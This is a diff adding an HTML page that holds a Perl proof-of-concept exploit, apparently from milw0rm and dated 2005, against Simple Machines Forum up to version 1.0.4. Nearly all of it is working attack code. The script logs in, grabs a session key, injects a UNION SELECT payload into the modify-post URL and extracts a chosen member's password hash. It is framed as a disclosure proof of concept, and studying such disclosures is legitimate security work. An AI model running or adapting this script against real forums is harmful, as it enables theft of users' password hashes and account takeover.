@@ -1,0 +1,87 @@
+<html><head><title>Simple Machines Forum <= 1.0.4 (modify) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
+################################################################################
+# SMF Modify SQL Injection // All Versions // By James http://www.gulftech.org #
+################################################################################
+# Simple proof of concept for the modify post SQL Injection issue I discovered #
+# in Simple Machine Forums. Supply this script with your username password and #
+# the complete url to a post you made, and have permission to edit. 06/19/2005 #
+################################################################################
+
+use LWP::UserAgent;
+
+if ( !$ARGV[3] ) 
+{
+	print &quot;Usage: smf.pl user pass target_uid modify_url\n&quot;;
+	exit;
+}
+
+print &quot;###################################################\n&quot;;
+print &quot;# Simple Machine Forums Modify Post SQL Injection #\n&quot;;
+print &quot;###################################################\n&quot;;
+
+my $user = $ARGV[0]; # your username
+my $pass = $ARGV[1]; # your password
+my $grab = $ARGV[2]; # the id of the target account
+my $post = $ARGV[3]; # the entire url to modify a post you made
+my $dump = '%20UNION%20SELECT%20memberName,0,passwd,0,0%20FROM%20smf_members%20WHERE%20ID_MEMBER=' . $grab . '/*';
+   $post =~ s/msg=([0-9]{1,10})/msg=$1$dump/;
+my $path = ( $post =~ /^(.*)\/index\.php/) ? $1: die(&quot;[!] The post url you entered seems invalid!\n&quot;);
+
+my $ua = new LWP::UserAgent;
+   $ua-&gt;agent(&quot;SMF Hash Grabber v1.0&quot; . $ua-&gt;agent);
+
+$ua-&gt;cookie_jar({});
+
+print &quot;[*] Trying $path ...\n&quot;;
+
+my $req = new HTTP::Request POST =&gt; $path . &quot;/index.php?action=login2&quot;;
+   $req-&gt;content_type('application/x-www-form-urlencoded');
+   $req-&gt;content('user=' . $user . '&amp;passwrd=' . $pass . '&amp;cookielength=-1');
+my $res = $ua-&gt;request($req); 
+
+print &quot;[*] Logging In ...\n&quot;;
+
+# When a correct login is made, a redirect is issued, and no 
+# text/html is sent to the browser really. We put 1024 to be
+# safe. This part can be altered in case of modded installs!
+if ( length($res-&gt;content) &lt; 1024 )
+{
+	print &quot;[+] Successfully logged in as $user \n&quot;;
+	my $sid = $ua-&gt;get($path . '/index.php?action=profile;sa=account');	
+
+	# We get our current session id to be used
+	print &quot;[*] Trying To Get Valid Sesc ID \n&quot;;
+	if ( $sid-&gt;content =~ /sesc=([a-f0-9]{32})/ )
+	{
+		# Replace the old session parameter with the
+		# new one so we do not get an access denied!
+		my $sesc = $1;
+		   $post =~ s/sesc=([a-f0-9]{32})/sesc=$sesc/;
+
+		print &quot;[+] Valid Sesc Id : $sesc\n&quot;;
+		print &quot;[*] Trying to get password hash ...\n&quot;;
+
+		my $pwn = $ua-&gt;get($post);	
+		if ( $pwn-&gt;content =~ /&gt;([a-z0-9]{32})&lt;\//i )
+		{
+			print &quot;[+] Got the password hash!\n&quot;;
+			print &quot;[+] Password Hash : $1\n&quot;;
+		}
+		else
+		{
+			print &quot;[!] Exploit Failed! Try manually verifying the vulnerability \n&quot;;
+		}
+	}
+	else
+	{
+		print '[!] Unable to obtain a valid sesc key!!';
+		exit;
+	}
+}
+else
+{
+	print '[!] There seemed to be a problem logging you in!';
+	exit;
+}
+
+# milw0rm.com [2005-06-21]</pre></html>
